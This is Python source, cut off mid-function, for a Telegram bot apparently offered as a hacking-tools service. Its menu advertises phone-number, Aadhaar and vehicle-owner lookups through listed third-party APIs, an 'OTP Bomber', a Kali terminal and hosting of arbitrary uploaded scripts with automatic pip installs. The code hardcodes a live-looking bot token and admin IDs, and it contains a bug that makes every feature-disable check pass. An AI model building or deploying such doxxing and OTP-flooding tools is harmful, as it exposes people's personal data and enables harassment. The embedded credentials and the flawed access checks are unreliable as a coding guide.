import telebot
from telebot import types
import subprocess
import os
import zipfile
import shutil
import time
import threading
import sys
import random
import string
import requests
import paramiko
import ast
import socket
import json
import re
import hashlib
import datetime
from datetime import datetime, timedelta
import uuid
import secrets
import instaloader
from urllib.parse import urlparse, quote
import psutil
import traceback
import io
import tempfile
import asyncio
import aiohttp
import aiosmtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import imaplib
import email
from email.header import decode_header
import smtplib
from bs4 import BeautifulSoup
import urllib.parse

# ==========================================
# 🔧 CONFIGURATION & GLOBALS
# ==========================================
TOKEN = '8338755145:AAH1b-5xPpXzY0BXwwTt2etmsK_Y8cXQFIo'
ADMIN_ID = 8179218740
OWNER_USERNAME = "@SIDIKI_MUSTAFA_92"
BOT_USERNAME = "@Hossssssttttt_bot"
LOG_GROUP_ID = -1002625393217

# Default force channels (updated with your channels)
FORCE_CHANNELS = [
    {
        "channel_username": "@hostinggggggg",
        "channel_link": "https://t.me/hostinggggggg",
        "channel_type": "public",
        "added_by": ADMIN_ID,
        "added_date": datetime.now().strftime("%Y-%m-%d")
    }
]

# APIs - WITH ADMIN PANEL FOR UPDATING
APIS = {
    "NUMBER_API": "https://neonblade-num.vercel.app/api?key=paid&type=mobile&term=",
    "AADHAAR_API": "https://shatirowner-family-info.vercel.app/fetch?key=Shatirowner&aadhaar=",
    "VEHICLE_API": "https://reseller-host.vercel.app/api/rc?number=",
    "SHERLOCK_API": "https://sherlock-api-omega.vercel.app/phone?username="
}

# Temp Mail API
TEMP_MAIL_API = "https://flipcartstore.serv00.net/API/InstaBets.php/"

# Paths
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, 'user_bots')
BOMBER_DIR = os.path.join(BASE_DIR, 'bomber_files')

# Database paths (using JSON files for persistence)
DB_DIR = os.path.join(BASE_DIR, 'database')
os.makedirs(DB_DIR, exist_ok=True)

USERS_DB_FILE = os.path.join(DB_DIR, 'users.json')
FILES_DB_FILE = os.path.join(DB_DIR, 'files.json')
SUBS_DB_FILE = os.path.join(DB_DIR, 'subscriptions.json')
KEYS_DB_FILE = os.path.join(DB_DIR, 'keys.json')
BANS_DB_FILE = os.path.join(DB_DIR, 'bans.json')
VPS_DB_FILE = os.path.join(DB_DIR, 'vps.json')
REFERRALS_DB_FILE = os.path.join(DB_DIR, 'referrals.json')
TEMP_MAIL_DB_FILE = os.path.join(DB_DIR, 'temp_mails.json')
SETTINGS_DB_FILE = os.path.join(DB_DIR, 'settings.json')
APIS_DB_FILE = os.path.join(DB_DIR, 'apis.json')

# File for persistent storage (for force channels)
FORCE_CHANNELS_FILE = os.path.join(DB_DIR, 'force_channels.json')

# Ensure Directories
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(BOMBER_DIR, exist_ok=True)

# Globals
# 🔴🔴🔴 YAHAN PAR CHANGE KIYA HAI - parse_mode HATA DIYA 🔴🔴🔴
bot = telebot.TeleBot(TOKEN)  # parse_mode='HTML' HATA DIYA

action_sessions = {}
running_processes = {}
vps_sessions = {}
temp_mail_sessions = {}

# Enhanced Rate Limiting & Anti-Spam
RATE_LIMIT_DURATION = 10  # seconds
RATE_LIMIT_COUNT = 20     # max actions in duration
BAN_DURATION = 30         # minutes
last_actions = {}

# Global requirements cache
global_requirements = []

# Channel limits
MAX_PUBLIC_CHANNELS = 10
MAX_PRIVATE_CHANNELS = 10

# Referral reward system
REFERRAL_REWARDS = {
    10: {"days": 2, "name": "2 Days Premium"},
    20: {"days": 5, "name": "5 Days Premium"}, 
    30: {"days": 7, "name": "7 Days Premium"},
    50: {"days": 30, "name": "30 Days Premium"}
}

# Database containers
force_channels = []
users_db = {}
files_db = {}
subs_db = {}
keys_db = {}
bans_db = {}
referrals_db = {}
vps_db = {}
user_channels = {}
temp_mails_db = {}
settings_db = {}
apis_db = {}

# Feature flags for admin to disable/enable commands
FEATURE_FLAGS = {
    "c_to_binary": True,
    "file_hosting": True,
    "number_lookup": True,
    "aadhaar_lookup": True,
    "vehicle_lookup": True,
    "sherlock_lookup": False,
    "otp_bomber": True,
    "temp_mail": True,
    "install_pips": True,
    "kali_terminal": True,
    "vps_manager": True,
    "instagram_dl": True
}

# ==========================================
# 📦 DATABASE MANAGEMENT (JSON-BASED)
# ==========================================
def load_database(file_path, default_value):
    """Load database from JSON file"""
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        return default_value
    except Exception as e:
        print(f"Error loading {file_path}: {e}")
        return default_value

def save_database(file_path, data):
    """Save database to JSON file"""
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"Error saving {file_path}: {e}")
        return False

def init_databases():
    """Initialize all databases"""
    global force_channels, users_db, files_db, subs_db, keys_db, bans_db, referrals_db, vps_db, user_channels, temp_mails_db, settings_db, apis_db
    
    # Load force channels
    force_channels = load_database(FORCE_CHANNELS_FILE, [])
    if not force_channels:
        # Add default channels
        force_channels = FORCE_CHANNELS.copy()
        save_database(FORCE_CHANNELS_FILE, force_channels)
    
    # Load other databases
    users_db = load_database(USERS_DB_FILE, {})
    files_db = load_database(FILES_DB_FILE, {})
    subs_db = load_database(SUBS_DB_FILE, {})
    keys_db = load_database(KEYS_DB_FILE, {})
    bans_db = load_database(BANS_DB_FILE, {})
    referrals_db = load_database(REFERRALS_DB_FILE, {})
    vps_db = load_database(VPS_DB_FILE, {})
    temp_mails_db = load_database(TEMP_MAIL_DB_FILE, {})
    settings_db = load_database(SETTINGS_DB_FILE, {})
    apis_db = load_database(APIS_DB_FILE, APIS.copy())
    
    # Initialize user_channels (temporary tracking)
    user_channels = {}
    
    # Initialize feature flags if not exists
    if 'feature_flags' not in settings_db:
        settings_db['feature_flags'] = FEATURE_FLAGS.copy()
        save_database(SETTINGS_DB_FILE, settings_db)

def save_all_databases():
    """Save all databases"""
    save_database(FORCE_CHANNELS_FILE, force_channels)
    save_database(USERS_DB_FILE, users_db)
    save_database(FILES_DB_FILE, files_db)
    save_database(SUBS_DB_FILE, subs_db)
    save_database(KEYS_DB_FILE, keys_db)
    save_database(BANS_DB_FILE, bans_db)
    save_database(REFERRALS_DB_FILE, referrals_db)
    save_database(VPS_DB_FILE, vps_db)
    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
    save_database(SETTINGS_DB_FILE, settings_db)
    save_database(APIS_DB_FILE, apis_db)

# Initialize databases
init_databases()

def load_global_requirements():
    global global_requirements
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            global_requirements = [line.strip() for line in f if line.strip()]

load_global_requirements()

def get_all_channels():
    """Get all force channels"""
    return force_channels

def get_channel_count_by_type(channel_type):
    """Get count of channels by type"""
    return len([c for c in force_channels if c['channel_type'] == channel_type])

# ==========================================
# 🛡️ ENHANCED ANTI-SPAM & SECURITY
# ==========================================
def is_banned(uid):
    """Check if user is banned. Returns (expiry, reason) if banned, (False, '') if not."""
    if uid == ADMIN_ID:
        return False, ""
    
    if str(uid) in bans_db:
        ban_data = bans_db[str(uid)]
        expiry = datetime.fromisoformat(ban_data['expiry'])
        if expiry > datetime.now():
            return expiry, ban_data['reason']
        else:
            # Unban expired user
            del bans_db[str(uid)]
            save_database(BANS_DB_FILE, bans_db)
            return False, ""
    return False, ""

def check_rate_limit(uid):
    """Enhanced rate limiting - ban if 20 actions in 10 seconds"""
    if uid == ADMIN_ID:
        return True
    
    now = time.time()
    if uid not in last_actions:
        last_actions[uid] = []
    
    # Remove old actions (older than 10 seconds)
    last_actions[uid] = [t for t in last_actions[uid] if now - t < RATE_LIMIT_DURATION]
    
    if len(last_actions[uid]) >= RATE_LIMIT_COUNT:
        # User is spamming, ban them for 30 minutes
        ban_expiry = datetime.now() + timedelta(minutes=BAN_DURATION)
        ban_reason = "Spamming/Excessive Requests (20 actions in 10 seconds)"
        
        bans_db[str(uid)] = {
            'expiry': ban_expiry.isoformat(),
            'reason': ban_reason
        }
        save_database(BANS_DB_FILE, bans_db)
        
        # Log to group with user info
        user_info = users_db.get(str(uid), {})
        username = f"@{user_info.get('username', '')}" if user_info.get('username') else f"ID:{uid}"
        
        log_to_group(f"🚨 USER BANNED (SPAM DETECTED)\n👤 User: {username}\n🆔 User ID: {uid}\n⏰ Duration: {BAN_DURATION} minutes\n📝 Reason: {ban_reason}\n🕒 Banned Until: {ban_expiry.strftime('%Y-%m-%d %H:%M:%S')}")
        
        try:
            bot.send_message(
                uid,
                f"🚫 <b>YOU ARE BANNED</b> 🚫\n\n"
                f"Your account has been temporarily banned for <b>{BAN_DURATION} minutes</b>.\n\n"
                f"<b>Reason:</b> {ban_reason}\n"
                f"<b>Banned Until:</b> {ban_expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"To appeal or request unban, contact the developer: {OWNER_USERNAME}",
                parse_mode='HTML'
            )
        except:
            pass
        
        return False
    
    last_actions[uid].append(now)
    return True

def rate_limit_and_ban_check(handler):
    def wrapper(m):
        uid = m.from_user.id
        
        ban_expiry, ban_reason = is_banned(uid)
        if ban_expiry:
            # Don't reply to banned users for 30 minutes
            return
        
        if not check_rate_limit(uid):
            return
        
        return handler(m)
    return wrapper

def rate_limit_and_ban_check_cb(handler):
    def wrapper(c):
        uid = c.from_user.id
        
        ban_expiry, ban_reason = is_banned(uid)
        if ban_expiry:
            bot.answer_callback_query(
                c.id,
                f"🚫 BANNED! Until: {ban_expiry.strftime('%H:%M')}\nReason: {ban_reason}",
                show_alert=True
            )
            return
        
        if not check_rate_limit(uid):
            return
        
        return handler(c)
    return wrapper

# ==========================================
# 🛠️ FEATURE CONTROL SYSTEM
# ==========================================
def is_feature_enabled(feature_name):
    """Check if a feature is enabled"""
    if ADMIN_ID:  # Admin always has access to all features
        return True
    
    return settings_db.get('feature_flags', {}).get(feature_name, True)

def feature_check(feature_name):
    """Decorator to check if a feature is enabled"""
    def decorator(handler):
        def wrapper(*args, **kwargs):
            if len(args) > 0:
                m = args[0]
                if hasattr(m, 'from_user'):
                    uid = m.from_user.id
                elif hasattr(m, 'message'):
                    uid = m.from_user.id
                    m = m.message
                else:
                    uid = m.chat.id
                
                if uid == ADMIN_ID:
                    return handler(*args, **kwargs)
                
                if not is_feature_enabled(feature_name):
                    if isinstance(m, types.CallbackQuery):
                        bot.answer_callback_query(m.id, f"❌ This feature ({feature_name}) is currently disabled!", show_alert=True)
                    else:
                        bot.reply_to(m, f"❌ <b>This feature is currently disabled!</b>\n\nFeature: {feature_name}\n\nContact admin if you need access.", parse_mode='HTML')
                    return
            return handler(*args, **kwargs)
        return wrapper
    return decorator

# ==========================================
# 📊 HELPER FUNCTIONS
# ==========================================
def get_footer():
    return f"\n\n💝 Dev: {OWNER_USERNAME} | 🤖 {BOT_USERNAME}"

def log_to_group(text, file_path=None, file_name=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                if file_name:
                    caption = f"{text}\n📄 File: {file_name}{get_footer()}"
                else:
                    caption = f"{text}{get_footer()}"
                bot.send_document(LOG_GROUP_ID, f, caption=caption, parse_mode='HTML')
        else:
            bot.send_message(LOG_GROUP_ID, text + get_footer(), parse_mode='HTML')
    except Exception as e:
        print(f"Log error: {e}")

def log_user(m):
    uid = m.from_user.id
    uname = m.from_user.username
    fname = m.from_user.first_name
    
    # Add to users database
    uid_str = str(uid)
    if uid_str not in users_db:
        users_db[uid_str] = {
            'user_id': uid,
            'username': uname,
            'first_name': fname,
            'credits': 5,
            'total_referrals': 0,
            'joined_date': datetime.now().strftime("%Y-%m-%d"),
            'last_bonus_date': datetime.now().strftime("%Y-%m-%d"),
            'referral_code': generate_referral_code(uid),
            'referral_points': 0,
            'referral_keys_earned': ''
        }
        save_database(USERS_DB_FILE, users_db)

def generate_referral_code(user_id):
    """Generate unique referral code for user"""
    code = f"King{user_id % 10000:04d}{secrets.token_hex(2).upper()}"
    return code

def get_user_from_info(user_id):
    """Get user from user database"""
    return users_db.get(str(user_id))

def is_premium(uid):
    if uid == ADMIN_ID:
        return True
    
    uid_str = str(uid)
    if uid_str in subs_db:
        expiry = datetime.fromisoformat(subs_db[uid_str]['expiry'])
        return expiry > datetime.now()
    return False

def check_all_channels_join(uid):
    """Check if user has joined ALL force channels and track"""
    if uid == ADMIN_ID:
        return True, ""
    
    not_joined_channels = []
    
    for channel in force_channels:
        channel_username = channel['channel_username'].replace('https://t.me/', '').replace('@', '')
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        try:
            # Check if already tracked as joined
            if uid in user_channels and channel_username in user_channels[uid]:
                continue  # Already tracked as joined
            
            # Check current status
            stat = bot.get_chat_member(channel_username, uid).status
            if stat not in ['creator', 'administrator', 'member']:
                not_joined_channels.append(channel_username)
            else:
                # Track this join
                if uid not in user_channels:
                    user_channels[uid] = []
                if channel_username not in user_channels[uid]:
                    user_channels[uid].append(channel_username)
        except Exception as e:
            print(f"Error checking channel {channel_username}: {e}")
            not_joined_channels.append(channel_username)
    
    if not_joined_channels:
        return False, not_joined_channels[0]
    return True, ""

def auto_install_modules(path, fname, user_id):
    """Auto-install modules for Python files using global requirements.txt"""
    try:
        file_path = os.path.join(path, fname)
        if not os.path.exists(file_path):
            return
        
        # Use global requirements.txt
        global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
        if os.path.exists(global_req_path):
            try:
                # Copy global requirements to user directory
                user_req_path = os.path.join(path, "requirements.txt")
                shutil.copy2(global_req_path, user_req_path)
                
                # Install requirements
                result = subprocess.run([sys.executable, '-m', 'pip', 'install', '--no-cache-dir', '-r', user_req_path],
                              cwd=path, timeout=180, capture_output=True, text=True)
                
                # Log installation result
                log_text = f"✅ Installed global requirements for {fname}\nOutput: {result.stdout[:500]}"
                if result.stderr:
                    log_text += f"\nErrors: {result.stderr[:500]}"
                
                print(log_text)
                
                # Log to group with username and file info
                user_info = users_db.get(str(user_id), {})
                username = f"@{user_info.get('username', '')}" if user_info.get('username') else f"ID:{user_id}"
                
                log_to_group(f"📦 REQUIREMENTS INSTALLED\n👤 User: {username}\n🆔 User ID: {user_id}\n📄 File: {fname}", 
                           user_req_path, "requirements.txt")
                
            except Exception as e:
                print(f"⚠️ Global requirements install error: {e}")
                fallback_install_modules(path, fname)
        else:
            fallback_install_modules(path, fname)
    
    except Exception as e:
        print(f"⚠️ Auto-install error for {fname}: {e}")

def fallback_install_modules(path, fname):
    """Fallback method to install modules by parsing imports"""
    try:
        file_path = os.path.join(path, fname)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        tree = ast.parse(content)
        imports = set()
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for n in node.names:
                    imports.add(n.name.split('.')[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.add(node.module.split('.')[0])
        
        builtin_modules = set(sys.builtin_module_names)
        imports_to_install = [imp for imp in imports if imp not in builtin_modules and imp and not imp.startswith('_')]
        
        if imports_to_install:
            for module in imports_to_install:
                try:
                    subprocess.run([sys.executable, '-m', 'pip', 'install', '--no-cache-dir', module],
                                  cwd=path, timeout=30, capture_output=True)
                except:
                    pass
    except:
        pass

# ==========================================
# 🏠 MAIN DASHBOARD & START - FIXED FOR ALL USERS
# ==========================================
@bot.message_handler(commands=['start', 'help'])
@rate_limit_and_ban_check
def start_command(m):
    try:
        uid = m.from_user.id
        print(f"📨 Start command from User ID: {uid}, Name: {m.from_user.first_name}")
        
        log_user(m)
        
        # Check referral
        args = m.text.split()
        if len(args) > 1:
            referral_input = args[1]
            
            # Check if it's a user ID
            if referral_input.isdigit():
                referrer_id = int(referral_input)
                if referrer_id != uid:
                    # Check if referrer exists
                    if str(referrer_id) in users_db:
                        process_referral(uid, referrer_id)
            
            # Check if it's a referral code
            else:
                for user_id_str, user_data in users_db.items():
                    if user_data.get('referral_code') == referral_input and int(user_id_str) != uid:
                        process_referral(uid, int(user_id_str))
                        break
        
        # Check channel joins
        joined, channel = check_all_channels_join(uid)
        
        if not joined:
            show_channels_to_join(m, uid)
            return
        
        # Send user info with profile photo
        send_user_info(m)
        
    except Exception as e:
        print(f"❌ Error in start_command: {e}")
        bot.reply_to(m, "❌ Error occurred. Please try again.")

def process_referral(new_user_id, referrer_id):
    """Process referral when new user joins"""
    # Check if already referred
    if str(new_user_id) in referrals_db:
        return
    
    # Check if referrer was previously in channels
    if referrer_id in user_channels and len(user_channels[referrer_id]) > 0:
        # Referrer was already in channels, don't count this referral
        return
    
    # Add referral (unverified initially)
    referrals_db[str(new_user_id)] = {
        'invited_by': referrer_id,
        'joined_date': datetime.now().strftime("%Y-%m-%d"),
        'verified': False
    }
    save_database(REFERRALS_DB_FILE, referrals_db)

def verify_referral(user_id):
    """Verify referral when user joins all channels"""
    user_id_str = str(user_id)
    if user_id_str in referrals_db and not referrals_db[user_id_str]['verified']:
        referral_data = referrals_db[user_id_str]
        referrer_id = referral_data['invited_by']
        
        # Mark as verified
        referrals_db[user_id_str]['verified'] = True
        save_database(REFERRALS_DB_FILE, referrals_db)
        
        # Update referrer's points
        referrer_str = str(referrer_id)
        if referrer_str in users_db:
            users_db[referrer_str]['referral_points'] = users_db[referrer_str].get('referral_points', 0) + 1
            users_db[referrer_str]['total_referrals'] = users_db[referrer_str].get('total_referrals', 0) + 1
            
            current_points = users_db[referrer_str]['referral_points']
            
            # Check for rewards
            reward_given = check_and_give_referral_reward(referrer_id, current_points)
            
            # Notify referrer
            try:
                bot.send_message(
                    referrer_id,
                    f"🎉 <b>REFERRAL VERIFIED!</b>\n\n"
                    f"Your referral has joined all channels!\n"
                    f"➕ <b>+1 Referral Point</b>\n"
                    f"📊 <b>Total Points:</b> {current_points}\n\n"
                    f"Keep referring to earn premium keys!",
                    parse_mode='HTML'
                )
            except:
                pass
            
            if reward_given:
                return True
        
        return True
    
    return False

def check_and_give_referral_reward(user_id, current_points):
    """Check if user qualifies for referral reward and give it"""
    for threshold, reward in REFERRAL_REWARDS.items():
        if current_points == threshold:  # Only trigger when exactly reaching threshold
            # Generate premium key
            key_code = f"KING-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
            
            # Save to keys database
            keys_db[key_code] = {
                'type': "PREM",
                'value': reward["days"],
                'generated_by': ADMIN_ID,
                'generated_date': datetime.now().strftime("%Y-%m-%d"),
                'used': False
            }
            save_database(KEYS_DB_FILE, keys_db)
            
            # Update user's earned keys record
            user_id_str = str(user_id)
            if user_id_str in users_db:
                current_keys = users_db[user_id_str].get('referral_keys_earned', '')
                new_keys = f"{current_keys},{reward['days']}d:{key_code}" if current_keys else f"{reward['days']}d:{key_code}"
                users_db[user_id_str]['referral_keys_earned'] = new_keys
                save_database(USERS_DB_FILE, users_db)
            
            # Give immediate premium
            expiry = (datetime.now() + timedelta(days=reward["days"])).isoformat()
            subs_db[user_id_str] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            
            # Notify user
            try:
                bot.send_message(
                    user_id,
                    f"🎁 <b>REFERRAL REWARD UNLOCKED!</b> 🎁\n\n"
                    f"Congratulations! You've reached <b>{threshold} referral points</b>!\n"
                    f"🎉 <b>Reward:</b> {reward['name']}\n"
                    f"🔑 <b>Key Code:</b> <code>{key_code}</code>\n"
                    f"⏰ <b>Premium activated for:</b> {reward['days']} days\n\n"
                    f"Your premium is now active! Keep referring for more rewards!",
                    parse_mode='HTML'
                )
            except:
                pass
            
            # Log to group
            user_info = users_db.get(user_id_str, {})
            username = f"@{user_info.get('username', '')}" if user_info.get('username') else f"ID:{user_id}"
            log_to_group(f"🎁 REFERRAL REWARD\n👤 User: {username}\n🆔 User ID: {user_id}\n📊 Points: {threshold}\n🎁 Reward: {reward['name']}\n🔑 Key: {key_code}")
            
            # Notify admin
            bot.send_message(
                ADMIN_ID,
                f"🎁 <b>REFERRAL REWARD GIVEN</b>\n\n"
                f"👤 User: {username}\n"
                f"🆔 ID: {user_id}\n"
                f"📊 Points: {threshold}\n"
                f"🎁 Reward: {reward['name']}\n"
                f"🔑 Key: {key_code}",
                parse_mode='HTML'
            )
            
            return True
    
    return False

def show_channels_to_join(m, uid):
    """Show channels that user needs to join"""
    # Get channels user hasn't joined
    unjoined_channels = []
    for channel in force_channels:
        channel_username = channel['channel_username'].replace('https://t.me/', '').replace('@', '')
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
            
        channel_link = channel['channel_link']
        channel_type = channel['channel_type']
        
        try:
            stat = bot.get_chat_member(channel_username, uid).status
            if stat not in ['creator', 'administrator', 'member']:
                unjoined_channels.append((channel_username, channel_link, channel_type))
        except:
            unjoined_channels.append((channel_username, channel_link, channel_type))
    
    if not unjoined_channels:
        # All channels joined, verify referral if any
        verify_referral(uid)
        send_user_info(m)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=1)
    
    for channel_username, channel_link, channel_type in unjoined_channels:
        channel_type_emoji = "🔒" if channel_type == "private" else "📢"
        mk.add(types.InlineKeyboardButton(f"{channel_type_emoji} Join {channel_username}", url=channel_link))
    
    mk.add(types.InlineKeyboardButton("✅ Verify Join", callback_data="check_join"))
    
    channels_list = "\n".join([f"• {channel[0]} ({'Private' if channel[2] == 'private' else 'Public'})" for channel in unjoined_channels])
    
    bot.send_message(
        m.chat.id,
        f"🔒 <b>ACCESS REQUIRED</b>\n\n"
        f"You must join all our channels to use this bot.\n\n"
        f"<b>Channels to join:</b>\n{channels_list}\n\n"
        f"After joining all channels, click <b>Verify Join</b> button.",
        reply_markup=mk,
        parse_mode='HTML'
    )

def send_user_info(m):
    """Send user information with profile photo"""
    try:
        uid = m.from_user.id
        user_info = users_db.get(str(uid), {})
        
        # Get user profile photo
        try:
            photos = bot.get_user_profile_photos(uid, limit=1)
            has_photo = photos.total_count > 0
        except:
            has_photo = False
        
        # Get premium status
        premium_status = "✅ PREMIUM" if is_premium(uid) else "🆓 FREE"
        
        # Get credits from user database
        credits = user_info.get('credits', 0)
        
        # Get referral info
        referral_code = user_info.get('referral_code', generate_referral_code(uid))
        referral_points = user_info.get('referral_points', 0)
        total_referrals = user_info.get('total_referrals', 0)
        
        # Generate referral rewards info
        rewards_info = "🎁 <b>Referral Rewards:</b>\n"
        for threshold, reward in REFERRAL_REWARDS.items():
            status = "✅" if referral_points >= threshold else "⏳"
            rewards_info += f"{status} {threshold} points → {reward['name']}\n"
        
        # Star emoji for premium users
        star = "⭐ " if is_premium(uid) else ""
        
        caption = (
            f"{star}<b>👋 Welcome {m.from_user.first_name}!</b>{star}\n\n"
            f"🆔 <b>User ID:</b> {uid}\n"
            f"👤 <b>Username:</b> @{m.from_user.username if m.from_user.username else 'N/A'}\n"
            f"📊 <b>Status:</b> {premium_status}\n"
            f"💰 <b>Credits:</b> {credits}\n"
            f"🤝 <b>Referral Code:</b> <code>{referral_code}</code>\n"
            f"🔗 <b>Referral Link:</b> https://t.me/{BOT_USERNAME[1:]}?start={referral_code}\n"
            f"📊 <b>Referral Points:</b> {referral_points}\n"
            f"👥 <b>Total Referrals:</b> {total_referrals}\n"
            f"📅 <b>Joined:</b> {datetime.now().strftime('%Y-%m-%d')}\n\n"
            f"{rewards_info}\n"
            f"🤖 <b>Bot:</b> {BOT_USERNAME}\n"
            f"👑 <b>Owner:</b> {OWNER_USERNAME}\n\n"
            f"💡 <b>Use the buttons below to navigate:</b>"
        )
        
        # Create main menu keyboard
        mk = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        mk.add("📁 File Hosting", "⚙️ Manage Files")
        mk.add("🔧 C to Binary", "💻 Kali Terminal")
        mk.add("📞 Number Lookup", "🔍 Aadhaar Info")
        mk.add("🚗 Vehicle Lookup", "🕵️ Sherlock Lookup")
        mk.add("📥 Instagram DL", "🔑 Redeem Key")
        mk.add("🤝 Referral System", "💎 Pricing")
        mk.add("📊 My Info", "☁️ VPS Manager")
        mk.add("💣 OTP Bomber", "📧 Temp Mail")
        mk.add("🔧 Install Pips")
        
        if uid == ADMIN_ID:
            mk.add("👑 Owner Panel")
        
        if has_photo:
            try:
                bot.send_photo(
                    m.chat.id,
                    photos.photos[0][0].file_id,
                    caption=caption,
                    reply_markup=mk,
                    parse_mode='HTML'
                )
            except:
                bot.send_message(m.chat.id, caption, reply_markup=mk, parse_mode='HTML')
        else:
            bot.send_message(m.chat.id, caption, reply_markup=mk, parse_mode='HTML')
            
    except Exception as e:
        print(f"❌ Error in send_user_info: {e}")
        bot.reply_to(m, "❌ Error loading user info. Please try again.")

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
@rate_limit_and_ban_check_cb
def cb_join(c):
    uid = c.from_user.id
    joined, channel = check_all_channels_join(uid)
    
    if joined:
        # Verify referral if any
        verify_referral(uid)
        
        bot.answer_callback_query(c.id, "✅ Verified! Welcome to KING Master Bot!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        send_user_info(c.message)
    else:
        bot.answer_callback_query(c.id, f"❌ You haven't joined {channel} yet! Join and try again.", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "📊 My Info")
@rate_limit_and_ban_check
def my_info(m):
    send_user_info(m)

@bot.message_handler(func=lambda m: m.text == "🤝 Referral System")
@rate_limit_and_ban_check
def referral_system(m):
    uid = m.from_user.id
    user_info = users_db.get(str(uid), {})
    
    referral_code = user_info.get('referral_code', generate_referral_code(uid))
    referral_points = user_info.get('referral_points', 0)
    total_referrals = user_info.get('total_referrals', 0)
    credits = user_info.get('credits', 0)
    
    # Get earned keys
    earned_keys = user_info.get('referral_keys_earned', '')
    keys_list = ""
    if earned_keys:
        keys_parts = earned_keys.split(',')
        for key_part in keys_parts:
            if ':' in key_part:
                days, key_code = key_part.split(':')
                keys_list += f"• {days} days: <code>{key_code}</code>\n"
    
    referral_text = (
        f"🤝 <b>REFERRAL SYSTEM</b>\n\n"
        f"💰 <b>Your Credits:</b> {credits}\n"
        f"📊 <b>Referral Points:</b> {referral_points}\n"
        f"👥 <b>Total Referrals:</b> {total_referrals}\n\n"
        f"🔑 <b>Your Referral Code:</b>\n<code>{referral_code}</code>\n\n"
        f"🔗 <b>Your Referral Link:</b>\nhttps://t.me/{BOT_USERNAME[1:]}?start={referral_code}\n\n"
        f"🎁 <b>Reward System:</b>\n"
    )
    
    for threshold, reward in REFERRAL_REWARDS.items():
        status = "✅ UNLOCKED" if referral_points >= threshold else f"⏳ {referral_points}/{threshold} points"
        referral_text += f"• {threshold} points → {reward['name']} ({status})\n"
    
    referral_text += f"\n📝 <b>How it works:</b>\n"
    referral_text += f"1. Share your referral link\n"
    referral_text += f"2. User must join ALL channels\n"
    referral_text += f"3. User clicks 'Verify Join'\n"
    referral_text += f"4. You get +1 point\n"
    referral_text += f"5. Reach points for auto rewards!\n\n"
    referral_text += f"⚠️ <b>Important:</b> User must be NEW (not already in channels)\n\n"
    
    if keys_list:
        referral_text += f"🔑 <b>Keys You've Earned:</b>\n{keys_list}\n"
    
    referral_text += f"💡 <b>Tip:</b> Share in groups for more points!"
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📤 Share Referral", url=f"https://t.me/share/url?url=https://t.me/{BOT_USERNAME[1:]}?start={referral_code}&text=Join%20Mustu%20Master%20Bot%20for%20free%20file%20hosting%2C%20hacking%20tools%2C%20OTP%20bomber%20and%20more!"))
    
    bot.send_message(m.chat.id, referral_text, reply_markup=mk, parse_mode='HTML')

# ==========================================
# 📁 FILE HOSTING SYSTEM
# ==========================================
@bot.message_handler(func=lambda m: m.text == "📁 File Hosting")
@rate_limit_and_ban_check
@feature_check("file_hosting")
def upload_ask(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    bot.reply_to(
        m,
        "📤 <b>Upload your Python (.py) file</b>\n\n"
        "⚠️ <b>Note:</b> Only .py files are supported\n"
        "🔧 <b>Auto-Install:</b> Required modules will be installed automatically\n"
        "📦 <b>Global Modules:</b> Pre-installed modules from owner configuration\n\n"
        "<b>Simply send your .py file now:</b>",
        parse_mode='HTML'
    )

@bot.message_handler(content_types=['document'])
@rate_limit_and_ban_check
def handle_docs(m):
    uid = m.from_user.id
    
    # Check if user is in C to Binary mode
    if action_sessions.get(uid) == "c_to_binary":
        return handle_c_file(m)
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Check if file hosting is enabled
    if not is_feature_enabled("file_hosting") and uid != ADMIN_ID:
        bot.reply_to(m, "❌ <b>File Hosting feature is currently disabled!</b>\n\nContact admin for more information.", parse_mode='HTML')
        return
    
    # Check if user has reached file limit
    if not is_premium(uid):
        user_files = [f for f_id, f in files_db.items() if f.get('user_id') == uid]
        if len(user_files) >= 1:
            bot.reply_to(
                m,
                "❌ <b>Free Limit Reached</b>\n\n"
                "Free users can host only 1 file.\n"
                "Upgrade to Premium for unlimited hosting.\n\n"
                "Tap 💎 Pricing to see plans.",
                parse_mode='HTML'
            )
            return
    
    fname = m.document.file_name
    if not fname.endswith('.py'):
        bot.reply_to(m, "❌ Only Python (.py) files are supported for hosting!", parse_mode='HTML')
        return
    
    # Prepare user directory
    uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
    path = os.path.join(UPLOAD_DIR, str(uid))
    os.makedirs(path, exist_ok=True)
    full_path = os.path.join(path, fname)
    
    msg = bot.reply_to(m, "⏬ Downloading file...", parse_mode='HTML')
    
    try:
        # Download file
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(full_path, "wb") as f:
